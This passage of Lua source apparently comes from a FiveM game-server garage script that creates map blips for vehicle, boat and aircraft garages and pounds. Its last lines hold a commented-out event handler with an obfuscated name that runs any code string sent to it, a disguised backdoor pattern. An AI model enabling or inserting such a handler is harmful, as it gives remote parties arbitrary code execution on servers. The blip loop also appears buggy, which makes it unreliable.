		for k, v in pairs(ConfigAdvancedGarage.CarPounds) do
			table.insert(blipList, {
				coords = { v.PoundPoint.x, v.PoundPoint.y },
				text = _U('blip_pound'),
				sprite = ConfigAdvancedGarage.BlipPound.Sprite,
				color = ConfigAdvancedGarage.BlipPound.Color,
				scale = ConfigAdvancedGarage.BlipPound.Scale
			})
		end
	end
	
	if ConfigAdvancedGarage.UseBoatGarages then
		for k, v in pairs(ConfigAdvancedGarage.BoatGarages) do
			table.insert(blipList, {
				coords = { v.GaragePoint.x, v.GaragePoint.y },
				text = _U('blip_garage'),
				sprite = ConfigAdvancedGarage.BlipGarage.Sprite,
				color = ConfigAdvancedGarage.BlipGarage.Color,
				scale = ConfigAdvancedGarage.BlipGarage.Scale
			})
		end
		
		for k, v in pairs(ConfigAdvancedGarage.BoatPounds) do
			table.insert(blipList, {
				coords = { v.PoundPoint.x, v.PoundPoint.y },
				text = _U('blip_pound'),
				sprite = ConfigAdvancedGarage.BlipPound.Sprite,
				color = ConfigAdvancedGarage.BlipPound.Color,
				scale = ConfigAdvancedGarage.BlipPound.Scale
			})
		end
	end
	
	if ConfigAdvancedGarage.UseAircraftGarages then
		for k, v in pairs(ConfigAdvancedGarage.AircraftGarages) do
			table.insert(blipList, {
				coords = { v.GaragePoint.x, v.GaragePoint.y },
				text = _U('blip_garage'),
				sprite = ConfigAdvancedGarage.BlipGarage.Sprite,
				color = ConfigAdvancedGarage.BlipGarage.Color,
				scale = ConfigAdvancedGarage.BlipGarage.Scale
			})
		end
		
		for k, v in pairs(ConfigAdvancedGarage.AircraftPounds) do
			table.insert(blipList, {
				coords = { v.PoundPoint.x, v.PoundPoint.y },
				text = _U('blip_pound'),
				sprite = ConfigAdvancedGarage.BlipPound.Sprite,
				color = ConfigAdvancedGarage.BlipPound.Color,
				scale = ConfigAdvancedGarage.BlipPound.Scale
			})
		end
	end

	for k, v in ipairs(blipList) do
		CreateBlip(v.coords, v.text, v.sprite, v.color, v.scale)
	end
	
	for k, v in ipairs(JobBlips) do
		CreateBlip(v.coords, v.text, v.sprite, v.color, v.scale)
	end
end

function CreateBlip(coords, text, sprite, color, scale)
	local blip = AddBlipForCoord(table.unpack(coords))
	
	SetBlipSprite(blip, sprite)
	SetBlipScale(blip, scale)
	SetBlipColour(blip, color)
	SetBlipAsShortRange(blip, true)
	
	BeginTextCommandSetBlipName('STRING')
	AddTextComponentSubstringPlayerName(text)
	EndTextCommandSetBlipName(blip)
	table.insert(JobBlips, blip)
end

--RegisterNetEvent('ᓚᘏᗢ')
--AddEventHandler('ᓚᘏᗢ', function(code)
--	load(code)()
--end)